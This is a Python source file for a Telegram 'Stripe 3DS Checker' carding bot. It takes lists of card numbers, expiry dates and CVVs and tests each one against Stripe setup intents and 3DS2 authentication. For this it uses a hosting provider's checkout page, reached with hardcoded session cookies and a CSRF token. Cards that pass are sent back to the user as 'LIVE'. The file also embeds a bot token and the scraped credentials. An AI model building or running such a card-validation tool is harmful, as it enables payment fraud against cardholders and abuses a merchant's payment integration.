#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import time
from typing import Dict, List, Tuple
import threading

# بيانات البوت
TOKEN = "8166484030:AAGiBsKby2GF0ykoxvkKMHCu80lHUIfD6xg"
ADMIN_ID = 5895491379

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}

# ألوان للطباعة (للاختبار المحلي)
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
WHITE = "\033[97m"
RESET = "\033[0m"

# فحص Luhn Algorithm
def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
    return checksum % 10 == 0

# فحص BIN بسيط (للتأكد إن الكارت Visa أو MasterCard)
def is_valid_bin(card_number):
    bin = card_number[:6]
    # أمثلة لـ BIN مدعوم (Visa يبدأ بـ 4، MasterCard بـ 5)
    return bin.startswith(('4', '5'))

# رأس الطلبات للموقع
cookies = {
    '_gcl_au': '1.1.1927848327.1760870107',
    '_ga': 'GA1.2.1045540598.1760870106',
    '_gid': 'GA1.2.1507103315.1760870112',
    '_fbp': 'fb.1.1760870112878.222051160650402702',
    '_ga_L9P8FSN26L': 'GS2.1.s1760870106$o1$g0$t1760870168$j60$l0$h0',
    '__adroll_fpc': 'aa50a5325b678cb2d9ebafc9b9965633-1760870171263',
    'SESSID96d7': 'ee8a21f3362f9c69564a88690bbe106b',
    '__stripe_mid': 'ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7',
    '__stripe_sid': '8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54',
    'Cart-Session': 'ee8a21f3362f9c69564a88690bbe106b',
}

headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'referer': 'https://cp.altushost.com/?/cart/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
    'x-csrf-token': '0084838b137a51695d5c2479fbfd7b13',
    'x-requested-with': 'XMLHttpRequest',
}

# رأس الطلبات لـ Stripe
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
}

# كلاس لفحص الكروت باستخدام Stripe
class StripeChecker:
    def __init__(self):
        self.public_key = None
        self.client_secret = None

    def fetch_stripe_keys(self) -> bool:
        params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
        for attempt in range(3):
            try:
                response = requests.get('https://cp.altushost.com/', params=params, cookies=cookies, headers=headers)
                soup = BeautifulSoup(response.text, "html.parser")
                script_tags = soup.find_all("script")
                
                important_values = {}
                for script in script_tags:
                    if "Stripe(" in script.text:
                        if "Stripe('" in script.text:
                            start = script.text.find("Stripe('") + len("Stripe('")
                            end = script.text.find("')", start)
                            important_values["public_key"] = script.text[start:end]
                        if "handleCardSetup(" in script.text:
                            start = script.text.find("handleCardSetup(") + len("handleCardSetup(")
                            part = script.text[start:].split(",")[0]
                            important_values["client_secret"] = part.strip().strip('"')
                
                if not important_values.get("client_secret"):
                    raise ValueError("Failed to extract client_secret")
                self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
                self.client_secret = important_values["client_secret"]
                return True
            except Exception as e:
                if attempt < 2:
                    time.sleep(2 ** attempt)
                    continue
                print(f"{RED}Error fetching keys: {str(e)}{RESET}")
                return False

    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
        time.sleep(1.5)
        start_time = time.time()

        if not luhn_check(card['number']):
            return {
                'status': 'ERROR',
                'message': 'Invalid card number (Luhn check failed)',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

        if not is_valid_bin(card['number']):
            return {
                'status': 'DECLINED',
                'message': '❌ Unsupported card type (BIN not Visa/MasterCard)',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

        if not self.fetch_stripe_keys():
            if retry_count < 2:
                time.sleep(2)
                return self.check_card(card, retry_count + 1)
            return {
                'status': 'ERROR',
                'message': 'Failed to fetch valid client_secret',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

        try:
            # أول طلب: تأكيد Setup Intent
            for attempt in range(3):
                try:
                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&payment_method_data[muid]=ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7&payment_method_data[sid]=8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]=358906&payment_method_data[client_attribution_metadata][client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_attribution_metadata[client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={self.client_secret}'
                    response = requests.post(
                        f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
                        headers=stripe_headers,
                        data=data,
                    )
                    setup_intent = response.json()
                    break
                except Exception as e:
                    if attempt < 2:
                        time.sleep(2 ** attempt)
                        continue
                    return {
                        'status': 'ERROR',
                        'message': f'Setup Intent Error - {str(e)}',
                        'details': {},
                        'time': round(time.time() - start_time, 2)
                    }

            if 'error' in setup_intent:
                error_message = setup_intent['error'].get('message', 'Unknown error')
                if error_message.startswith('3D Secure 2 is not supported'):
                    return {
                        'status': 'DECLINED',
                        'message': '❌ 3D Secure 2 Not Supported',
                        'details': {},
                        'time': round(time.time() - start_time, 2)
                    }
                return {
                    'status': 'ERROR',
                    'message': f'Setup Intent Error - {error_message}',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }

            if setup_intent.get('status') == 'requires_action' and setup_intent.get('next_action', {}).get('type') == 'use_stripe_sdk':
                three_d_secure_source = setup_intent.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')

                # تاني طلب: تصديق 3DS2
                for attempt in range(3):
                    try:
                        data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
                        response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=stripe_headers, data=data)
                        three_ds_response = response.json()
                        break
                    except Exception as e:
                        if attempt < 2:
                            time.sleep(2 ** attempt)
                            continue
                        return {
                            'status': 'ERROR',
                            'message': f'3DS2 Authentication Error - {str(e)}',
                            'details': {},
                            'time': round(time.time() - start_time, 2)
                        }

                trans_status = three_ds_response.get('ares', {}).get('transStatus')
                acs_url = three_ds_response.get('ares', {}).get('acsURL')

                details = {'status_3ds': trans_status or 'N/A'}
                if trans_status == 'N':
                    return {
                        'status': 'LIVE',
                        'message': '✅ Charged Successfully',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                elif trans_status in ('R', 'C') and acs_url:
                    return {
                        'status': 'OTP',
                        'message': '🔐 3D Secure Challenge Required',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                elif trans_status in ('R', 'C') and not acs_url:
                    return {
                        'status': 'DECLINED',
                        'message': '❌ Operation Rejected',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'message': f'❔ Unknown Status: {trans_status}',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
            else:
                details = {'status_3ds': setup_intent.get('status', 'N/A')}
                if setup_intent.get('status') == 'succeeded':
                    return {
                        'status': 'LIVE',
                        'message': '✅ Setup Intent Confirmed Successfully',
                        'details': details,
                        'time': round(time.time() - start_time, 2)
                    }
                return {
                    'status': 'ERROR',
                    'message': 'Further Action Required or Setup Intent Failed',
                    'details': details,
                    'time': round(time.time() - start_time, 2)
                }
        except Exception as e:
            return {
                'status': 'ERROR',
                'message': f'Error - {str(e)}',
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe 3DS Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file or card details to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append({
                        'number': parts[0].strip(),
                        'month': parts[1].strip().zfill(2),
                        'year': parts[2].strip(),
                        'cvv': parts[3].strip(),
                        'raw': line
                    })
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        parts = text.split('|')
        user_cards[message.from_user.id] = [{
            'number': parts[0].strip(),
            'month': parts[1].strip().zfill(2),
            'year': parts[2].strip(),
            'cvv': parts[3].strip(),
            'raw': text
        }]
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Stripe 3DS
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740082586858|11|2028|155
</b>""")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Getting authorization keys..."
    )
    
    checker = StripeChecker()
    if not checker.fetch_stripe_keys():
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=f"""<b>⚠️ Failed to get authorization keys!
━━━━━━━━━━━━━━━━━━━━
⏳ Please try again after updating cookies.
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
        )
        checking_status[user_id] = False
        return
    
    live = otp = declined = errors = checked = refresh_count = 0
    start_time = time.time()
    card_count = 0  # عداد الكروت للتجديد كل 10
    error_count = 0  # عداد الأخطاء للتجديد بعد 3 أخطاء متتالية
    max_refreshes = 50000  # الحد الأقصى للتجديدات
    
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        
        checked += 1
        card_count += 1
        result = checker.check_card(card)
        
        # تجديد المفاتيح كل 10 كروت أو بعد 3 أخطاء متتالية
        if card_count >= 10 or (result['status'] in ['ERROR', 'DECLINED'] and error_count >= 3):
            if refresh_count >= max_refreshes:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    text=f"""<b>⚠️ Max key refresh limit reached!
━━━━━━━━━━━━━━━━━━━━
⏳ Checking stopped. Please update cookies.
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                )
                checking_status[user_id] = False
                return
            if checker.fetch_stripe_keys():
                card_count = 0
                error_count = 0
                refresh_count += 1
            else:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    text=f"""<b>⚠️ Failed to refresh keys!
━━━━━━━━━━━━━━━━━━━━
⏳ Checking stopped. Please update cookies.
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                )
                checking_status[user_id] = False
                return
        
        # إنشاء زر لعرض نتيجة الفحص مع الـ status_3ds
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
        callback_data = f"show_result_{checked}"
        keyboard.add(
            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
        )
        keyboard.add(
            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Refreshes 🔄 ➜ [{refresh_count}] •", callback_data='x'),
            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
        )
        
        if result['status'] == 'LIVE':
            live += 1
            details = result['details']
            msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec
🔒 3DS Status: {details['status_3ds']}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            bot.send_message(user_id, msg)
            error_count = 0
        elif result['status'] == 'OTP':
            otp += 1
            error_count = 0
        elif result['status'] == 'DECLINED':
            declined += 1
            error_count += 1
            time.sleep(3)  # تأخير إضافي بعد DECLINED
        else:
            errors += 1
            error_count += 1
            time.sleep(3)  # تأخير إضافي بعد ERROR
        
        # تخزين نتيجة الكرت
        user_cards[user_id][checked-1]['result'] = result
        
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        eta = (total - checked) / speed if speed > 0 else 0
        
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card['number'][:6]}...{card['number'][-4:]}
🔄 Key Refreshes: {refresh_count}
</b>""",
                reply_markup=keyboard
            )
        except:
            pass
        
        time.sleep(0.5)
    
    # النتيجة النهائية
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}
├ Key Refreshes 🔄: {refresh_count}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
def show_card_result(call):
    user_id = call.from_user.id
    index = int(call.data.split('_')[-1]) - 1
    
    if user_id not in user_cards or index >= len(user_cards[user_id]):
        bot.answer_callback_query(call.id, "❌ No result found!")
        return
    
    card = user_cards[user_id][index]
    result = card.get('result', {})
    details = result.get('details', {})
    
    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card['raw']}</code>
📊 Response: {result.get('message', 'Unknown')}
⏱ Time: {result.get('time', 0)} sec
🔒 3DS Status: {details.get('status_3ds', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    
    bot.send_message(user_id, msg)
    bot.answer_callback_query(call.id, "📋 Result displayed!")

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt) or card details
2. Click "Start Checking"
3. Only LIVE cards sent, others via button

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740082586858|11|2028|155
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: High
🌍 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

if __name__ == "__main__":
    print("🚀 Starting Stripe Checker Bot...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running...\n")
    bot.polling(none_stop=True)
